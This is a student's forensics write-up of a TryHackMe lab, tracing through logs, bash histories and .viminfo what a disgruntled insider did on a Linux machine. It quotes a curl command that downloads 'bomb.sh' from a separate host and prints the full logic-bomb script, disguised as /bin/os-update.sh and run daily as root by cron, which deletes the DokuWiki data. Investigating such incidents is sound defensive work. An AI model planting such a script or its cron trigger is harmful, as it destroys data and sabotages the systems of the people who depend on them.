# TryHackMe — Disgruntled 🕵️

**Platform:** TryHackMe  
**Room:** [Disgruntled](https://tryhackme.com/room/disgruntled)  
**Category:** Digital Forensics / Linux Investigation  


---

## Scenario

> *"An employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig. CyberT wants us to check if this person has done anything malicious to any of their assets."*

The task: investigate a Linux machine last touched by a disgruntled IT employee and figure out what they did, what they planted, and when it's set to blow.

---

## My Approach

Started with privilege escalation context — the machine was already accessible as root. The hint said to look at **privileged commands**, so my first move was checking bash histories and authorization logs.

---

## Task 1 — The Package Install

### Question: What is the full COMMAND used to install a package with elevated privileges?

**Steps taken:**

1. Navigated to `/home` and listed all users:
   ```bash
   ls /home
   ```
   Found three users: `ubuntu`, `cybert`, and `it-admin`.

2. Started with `cybert` since that's the suspect user. Checked their bash history:
   ```bash
   cd /home/cybert
   cat .bash_history
   ```

   The history showed a clear sequence — the user installed **DokuWiki** (a PHP-based wiki software):
   ```
   sudo apt install dokuwiki
   sudo rm /var/lib/dpkg/lock
   sudo dpkg --configure -a
   ...
   ```

3. To confirm via logs, searched `auth.log.1` for the `dokuwiki` keyword:
   ```bash
   cat /var/log/auth.log.1 | grep "dokuwiki"
   ```

   The log entry showed the full privileged command with all metadata:
   ```
   Dec 28 06:17:30 ip-10-10-168-55 sudo: cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
   ```

**Answer:**
```
/usr/bin/apt install dokuwiki
```

---

### Question: What was the present working directory (PWD) when the previous command was run?

Pulled directly from the same `auth.log.1` entry — the `PWD` field was already there:

```
PWD=/home/cybert
```

**Answer:**
```
/home/cybert
```

---

## Task 2 — The Rogue User & Sudoers Tampering

### Question: Which user was created after the package was installed?

Continuing through `cybert`'s bash history, after the DokuWiki setup commands, I spotted:

```bash
sudo adduser it-admin
sudo visudo
su it-admin
```

The user **`it-admin`** was created — suspicious because this is outside the scope of "just install a service."

**Answer:**
```
it-admin
```

---

### Question: When was the sudoers file updated? (Format: Month Day HH:MM:SS)

Searched the auth logs for `visudo` activity:

```bash
cat auth.log | grep "visudo"
cat auth.log.1 | grep "visudo"
```

The log showed two hits — one for `ubuntu` user in December 22, and the critical one for `cybert` on December 28:

```
Dec 28 06:27:34  ip-10-10-168-55  sudo:  cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
```

**Answer:**
```
Dec 28 06:27:34
```

---

### Question: A script file was opened using the "vi" text editor. What is the name of this file?

Moved to `it-admin`'s home directory to check their bash history:

```bash
cd /home/it-admin
cat .bash_history
```

The history revealed something alarming:

```bash
whoami
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
ls
ls -la
cd ~/
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
sudo vi bomb.sh
ls
rm bomb.sh
sudo nano /etc/crontab
exit
```

The file `bomb.sh` was downloaded from an external IP, opened in `vi` for editing, then **deleted** to hide evidence.

**Answer:**
```
bomb.sh
```

---

## Task 3 — Tracking the Bomb

### Question: What is the command used to download `bomb.sh`?

From the `it-admin` bash history above:

```bash
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

This downloads `bomb.sh` from an internal/attacker-controlled server at `10.10.158.38` on port `8080`.

**Answer:**
```
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

---

### Question: The file was renamed and moved to a different directory. What is the full path of this file now?

The attacker edited `bomb.sh` with `vi` and saved it to a disguised location. Checked `it-admin`'s `.viminfo` (vim session metadata):

```bash
cat /home/it-admin/.viminfo
```

The viminfo file showed the saveas command used during the vi session:

```
:saveas /bin/os-update.sh
```

The file was **renamed `os-update.sh` and dropped into `/bin/`** — a legitimate-looking name to avoid suspicion.

Confirmed by navigating to `/bin` and listing:

```bash
cd /bin
ls
```

`os-update.sh` was present. Verified with `stat`:

```bash
stat os-update.sh
```

Output:
```
File: os-update.sh
Size: 325        Blocks: 8    IO Block: 4096   regular file
Modify: 2022-12-28 06:29:43.998004273 +0000
```

**Answer:**
```
/bin/os-update.sh
```

---

### Question: When was the file last modified? (Format: Month Day HH:MM)

From the `stat` output above:

```
Modify: 2022-12-28 06:29:43
```

**Answer:**
```
Dec 28 06:29
```

---

### Question: What is the name of the file that will be created when `os-update.sh` executes?

Read the contents of the malicious script:

```bash
cat /bin/os-update.sh
```

```bash
# 2022-06-05 - Initial version
# 2022-10-11 - Fixed bug
# 2022-10-15 - Changed from 30 days to 90 days
OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
if [ -z "$OUTPUT" ]; then
        rm -r /var/lib/dokuwiki
        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt
fi
```

**What this does:**
- Checks if `it-admin` has logged in within the last 90 days
- If NOT (i.e. the user was deleted/locked out), it **deletes the entire DokuWiki installation** at `/var/lib/dokuwiki`
- Then writes a gloating goodbye message to `/goodbye.txt`, signed as `mistermeist3r`

**Answer:**
```
goodbye.txt
```

---

## Task 4 — The Trigger: Cron Job

### Question: At what time will the malicious file trigger? (Format: HH:MM AM/PM)

The attacker used `sudo nano /etc/crontab` to schedule the script. Checked it:

```bash
cat /etc/crontab
```

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ...
47 6    * * 7   root    test -x /usr/sbin/anacron || ...
52 6    1 * *   root    test -x /usr/sbin/anacron || ...
0  8    * * *   root    /bin/os-update.sh
```

The cron entry `0 8 * * * root /bin/os-update.sh` means:
- Minute: `0`
- Hour: `8`
- Every day, every month, every weekday
- Run as: `root`

**Trigger time: 08:00 AM daily.**

**Answer:**
```
08:00 AM
```

---



## Key Artifacts

| Artifact | Value |
|---|---|
| Attacker user | `cybert` |
| Backdoor user created | `it-admin` |
| Attacker alias in script | `mistermeist3r` |
| Malicious script | `/bin/os-update.sh` |
| Script downloaded from | `10.10.158.38:8080/bomb.sh` |
| Cron schedule | Daily at 08:00 AM |
| Payload | Delete `/var/lib/dokuwiki` + write `/goodbye.txt` |



---

## Key Takeaways

> **Insider threats are sneaky.** The malicious activity here was disguised as legitimate IT work — installing a service is normal, but creating backdoor users and planting logic bombs isn't.

- Always audit `sudo` usage via `auth.log`, not just bash history (bash history can be deleted or modified)
- `.viminfo` and `.bash_history` are forensic gold — don't skip user home directories
- Logic bombs via cron are a classic persistence + sabotage combo
- Disguising malware as system scripts (`os-update.sh`) is a common evasion tactic
- Monitor for `adduser` + `visudo` combos outside of approved change windows

---

*Writeup by [Nitisha](https://github.com/Nitishapunmiya) | #StudentToSOC #BuildInPublic #Unhackd*
